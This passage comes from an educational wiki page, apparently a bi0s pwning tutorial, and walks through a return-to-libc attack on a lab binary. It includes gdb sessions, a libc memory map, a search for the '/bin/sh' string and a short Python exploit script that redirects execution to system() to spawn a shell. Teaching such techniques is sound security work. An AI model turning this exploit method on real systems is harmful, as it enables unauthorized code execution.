+<span class="w">   </span><span class="mh">0x0804846c</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x0804846e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048471</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x10</span><span class="o">]</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048474</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048475</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8048530</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x0804847a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048350</span><span class="w"> </span><span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x0804847f</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048482</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x10</span><span class="o">]</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048485</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048486</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8048533</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x0804848b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048330</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048490</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048493</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">nop</span><span class="w"></span>
+<span class="w">   </span><span class="mh">0x08048494</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">leave</span><span class="w">  </span>
+<span class="w">   </span><span class="mh">0x08048495</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">ret</span><span class="w"></span>
+</pre></div>
+</td></tr></tbody></table>
+<p>As you can see, this time we only have to give 0x10 bytes of junk 
+data and then 4 more bytes for ebp, to reach the saved eip. Earlier we 
+overwrote the saved eip with the address of the <code>win</code> function, but now we will overwrite it directly with the address of <code>system</code>. Here is how you find the address of system -</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="codehilite" id="__code_11"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_11 pre, #__code_11 code"><span class="md-clipboard__message"></span></button><pre><span></span>   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">start</span>
+   <span class="k">Temporary</span> <span class="n">breakpoint</span> <span class="mi">1</span> <span class="k">at</span> <span class="mi">0</span><span class="n">x8048499</span> 
+   <span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vignesh</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">ret2libc</span>
+
+   <span class="k">Temporary</span> <span class="n">breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="n">x08048499</span> <span class="k">in</span> <span class="n">main</span> <span class="p">()</span>
+   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">print</span> <span class="k">system</span> 
+   <span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="err">{</span><span class="o">&lt;</span><span class="nb">text</span> <span class="k">variable</span><span class="p">,</span> <span class="k">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="err">}</span> <span class="mi">0</span><span class="n">xf7e5a940</span> <span class="o">&lt;</span><span class="k">system</span><span class="o">&gt;</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Thus the address of <code>system</code> is <code>0xf7e5a940</code>. Let’s craft our input and then run the program with that input</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite" id="__code_12"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_12 pre, #__code_12 code"><span class="md-clipboard__message"></span></button><pre><span></span>   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span><span class="o">*</span><span class="n">vuln</span><span class="o">+</span><span class="mi">42</span>
+   <span class="n">Breakpoint</span> <span class="mi">1</span> <span class="k">at</span> <span class="mi">0</span><span class="n">x8048495</span>
+   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="o">!</span> <span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">'print "A" * 0x14 + "\x40\xa9\xe5\xf7"'</span>  <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>    
+   <span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vignesh</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">ret2libc</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+   <span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="n">x08048495</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>
+   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
+   <span class="o">=&gt;</span> <span class="mi">0</span><span class="n">x8048495</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">42</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">ret</span>
+   <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
+   <span class="mi">0</span><span class="n">xf7e5a940</span> <span class="k">in</span> <span class="k">system</span> <span class="p">()</span> <span class="k">from</span> <span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Right, so we entered system. But what about the argument? Well, let’s
+ fix that now. Do you remember how arguments are passed to function in 
+x86? Yes, they are pushed on to the stack, in reverse order, before the 
+function is called. So basically, arguments of the function are found, 
+starting from <code>ebp+0x8</code>, <code>ebp+0xc</code>, <code>ebp+0x10</code> and so on, <code>ebp+0x4</code> being the return address of the function. </p>
+<p>So in our case, the <code>ret</code> instruction at the end of the <code>vuln</code> function is calling <code>system</code>. Thus the stack address which initially contained the saved eip and now contains the address to <code>system()</code>, will be the ebp, when <code>system()</code> is executing. Thus the return address of <code>system</code>
+ is the one directly above (i.e 4 byte’s on top) and then come the 
+arguments. For us there is only one argument and that is the pointer to 
+the string <code>/bin/sh</code>. Let’s find out the address of this string in the libc - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28</pre></div></td><td class="code"><div class="codehilite" id="__code_13"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_13 pre, #__code_13 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">inp</span>
+<span class="nv">Breakpoint</span> <span class="mi">1</span>, <span class="mi">0</span><span class="nv">x08048495</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="ss">()</span>
+<span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">info</span> <span class="nv">proc</span> <span class="nv">map</span>
+<span class="nv">process</span> <span class="mi">16302</span>
+<span class="nv">Mapped</span> <span class="nv">address</span> <span class="nv">spaces</span>:
+
+<span class="nv">Start</span> <span class="nv">Addr</span>   <span class="k">End</span> <span class="nv">Addr</span>       <span class="nv">Size</span>     <span class="nv">Offset</span> <span class="nv">objfile</span>
+ <span class="mi">0</span><span class="nv">x8048000</span>  <span class="mi">0</span><span class="nv">x8049000</span>     <span class="mi">0</span><span class="nv">x1000</span>        <span class="mi">0</span><span class="nv">x0</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">ret2libc</span>
+ <span class="mi">0</span><span class="nv">x8049000</span>  <span class="mi">0</span><span class="nv">x804a000</span>     <span class="mi">0</span><span class="nv">x1000</span>        <span class="mi">0</span><span class="nv">x0</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">ret2libc</span>
+ <span class="mi">0</span><span class="nv">x804a000</span>  <span class="mi">0</span><span class="nv">x804b000</span>     <span class="mi">0</span><span class="nv">x1000</span>     <span class="mi">0</span><span class="nv">x1000</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">ret2libc</span>
+ <span class="mi">0</span><span class="nv">x804b000</span>  <span class="mi">0</span><span class="nv">x806d000</span>    <span class="mi">0</span><span class="nv">x22000</span>        <span class="mi">0</span><span class="nv">x0</span> [<span class="nv">heap</span>]
+<span class="mi">0</span><span class="nv">xf7e1f000</span> <span class="mi">0</span><span class="nv">xf7e20000</span>     <span class="mi">0</span><span class="nv">x1000</span>        <span class="mi">0</span><span class="nv">x0</span> 
+<span class="mi">0</span><span class="nv">xf7e20000</span> <span class="mi">0</span><span class="nv">xf7fcd000</span>   <span class="mi">0</span><span class="nv">x1ad000</span>        <span class="mi">0</span><span class="nv">x0</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">libc</span>.<span class="nv">so</span>.<span class="mi">6</span>
+<span class="mi">0</span><span class="nv">xf7fcd000</span> <span class="mi">0</span><span class="nv">xf7fce000</span>     <span class="mi">0</span><span class="nv">x1000</span>   <span class="mi">0</span><span class="nv">x1ad000</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">libc</span>.<span class="nv">so</span>.<span class="mi">6</span>
+<span class="mi">0</span><span class="nv">xf7fce000</span> <span class="mi">0</span><span class="nv">xf7fd0000</span>     <span class="mi">0</span><span class="nv">x2000</span>   <span class="mi">0</span><span class="nv">x1ad000</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">libc</span>.<span class="nv">so</span>.<span class="mi">6</span>
+<span class="mi">0</span><span class="nv">xf7fd0000</span> <span class="mi">0</span><span class="nv">xf7fd1000</span>     <span class="mi">0</span><span class="nv">x1000</span>   <span class="mi">0</span><span class="nv">x1af000</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">libc</span>.<span class="nv">so</span>.<span class="mi">6</span>
+<span class="mi">0</span><span class="nv">xf7fd1000</span> <span class="mi">0</span><span class="nv">xf7fd5000</span>     <span class="mi">0</span><span class="nv">x4000</span>        <span class="mi">0</span><span class="nv">x0</span> 
+<span class="mi">0</span><span class="nv">xf7fd5000</span> <span class="mi">0</span><span class="nv">xf7fd8000</span>     <span class="mi">0</span><span class="nv">x3000</span>        <span class="mi">0</span><span class="nv">x0</span> [<span class="nv">vvar</span>]
+<span class="mi">0</span><span class="nv">xf7fd8000</span> <span class="mi">0</span><span class="nv">xf7fd9000</span>     <span class="mi">0</span><span class="nv">x1000</span>        <span class="mi">0</span><span class="nv">x0</span> [<span class="nv">vdso</span>]
+<span class="mi">0</span><span class="nv">xf7fd9000</span> <span class="mi">0</span><span class="nv">xf7ffc000</span>    <span class="mi">0</span><span class="nv">x23000</span>        <span class="mi">0</span><span class="nv">x0</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mi">2</span>.<span class="mi">23</span>.<span class="nv">so</span>
+<span class="mi">0</span><span class="nv">xf7ffc000</span> <span class="mi">0</span><span class="nv">xf7ffd000</span>     <span class="mi">0</span><span class="nv">x1000</span>    <span class="mi">0</span><span class="nv">x22000</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mi">2</span>.<span class="mi">23</span>.<span class="nv">so</span>
+<span class="mi">0</span><span class="nv">xf7ffd000</span> <span class="mi">0</span><span class="nv">xf7ffe000</span>     <span class="mi">0</span><span class="nv">x1000</span>    <span class="mi">0</span><span class="nv">x23000</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mi">2</span>.<span class="mi">23</span>.<span class="nv">so</span>
+<span class="mi">0</span><span class="nv">xfffdd000</span> <span class="mi">0</span><span class="nv">xffffe000</span>    <span class="mi">0</span><span class="nv">x21000</span>        <span class="mi">0</span><span class="nv">x0</span> [<span class="nv">stack</span>]
+<span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">find</span> <span class="mi">0</span><span class="nv">xf7e20000</span>, <span class="mi">0</span><span class="nv">xf7fd1000</span> , <span class="s2">"</span><span class="s">/bin/sh</span><span class="s2">"</span>
+<span class="mi">0</span><span class="nv">xf7f78e8b</span>
+<span class="mi">1</span> <span class="nv">pattern</span> <span class="nv">found</span>.
+<span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="nv">s</span> <span class="mi">0</span><span class="nv">xf7f78e8b</span>
+<span class="mi">0</span><span class="nv">xf7f78e8b</span>: <span class="s2">"</span><span class="s">/bin/sh</span><span class="s2">"</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>We first find the starting and the ending addresses of libc with <code>info proc map</code> and then use these in the <code>find</code> command. Refer <a href="https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-using-gdb">here</a><img name="kl_1567871723423" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12"> if you are not clear with the find command. </p>
+<p>Thus the <code>0xf7f78e8b</code> is a pointer to the string <code>/bin/sh</code>.
+ Now let’s put together the whole exploit. Writing the exploit in a 
+separate file, as a python script might prove to be a bit more 
+convenient rather than writing it inline in gdb. </p>
+<p></p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite" id="__code_14"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_14 pre, #__code_14 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="sd">''' exploit.py '''</span>
+
+<span class="n">inp</span><span class="o">=</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x10</span> <span class="c1"># The initial junk bytes to fill u the stack space</span>
+<span class="n">inp</span><span class="o">+=</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># To overwrite the saved ebp</span>
+<span class="n">inp</span><span class="o">+=</span><span class="s2">"</span><span class="se">\x40\xa9\xe5\xf7</span><span class="s2">"</span> <span class="c1"># Overwrite the save eip with address of system</span>
+<span class="n">inp</span><span class="o">+=</span><span class="s2">"AAAA"</span> <span class="c1"># This is the return address of system. Since it will never return, we can give junk here.</span>
+<span class="n">inp</span><span class="o">+=</span><span class="s2">"</span><span class="se">\x8b\x8e\xf7\xf7</span><span class="s2">"</span> <span class="c1">#The argument to system. This is the pointer to the string "/bin/sh"</span>
+
+<span class="nb">open</span><span class="p">(</span><span class="s2">"/tmp/inp"</span><span class="p">,</span><span class="s1">'w'</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span> <span class="c1"># Open /tmp/inp for writing and put inp in it</span>
+<span class="sd">''' run "python exploit.py" in the terminal to run this file '''</span>
+</pre></div>
+</td></tr></tbody></table>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4</pre></div></td><td class="code"><div class="codehilite" id="__code_15"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_15 pre, #__code_15 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+    <span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="n">x08048495</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>
+    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">c</span>
+    <span class="n">process</span> <span class="mi">17735</span> <span class="k">is</span> <span class="n">executing</span> <span class="k">new</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span>
+</pre></div>
+</td></tr></tbody></table><p></p>
+<p>Thus the program executed system with the argument “/bin/sh”, resulting in a shell.</p>
+<p>Therefore we were able to execute a shell without any helper 
+functions. Instead of system we can redirect the control flow to any 
+standard C function. This technique is known as <strong><em>return-to-libc</em></strong> or <strong><em>ret2libc</em></strong>. </p>
+<p>Unfortunately this exploit will not work outside gdb, due to a 
+mitigation technique called Address Space Layout Randomization (ASLR). 
+We will discuss more about this mitigation and how to bypass this in the
+ later sections.</p>
+</article>
+</div>
+</div>
+</main>
+<footer class="md-footer">
+<div class="md-footer-nav">
+<nav class="md-footer-nav__inner md-grid">
+<a href="/help/bi0s_wiki/pwning/stack/smashthestack/" title="Smash the Stack" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Previous
+</span>
+Smash the Stack
+</span>
+</div>
+</a>
+<a href="/help/bi0s_wiki/pwning/return2libc/return-to-shellcode/" title="ret2shellcode" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Next
+</span>
+ret2shellcode
+</span>
+</div>
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+</a>
+</nav>
+</div>
+{% endblock %}
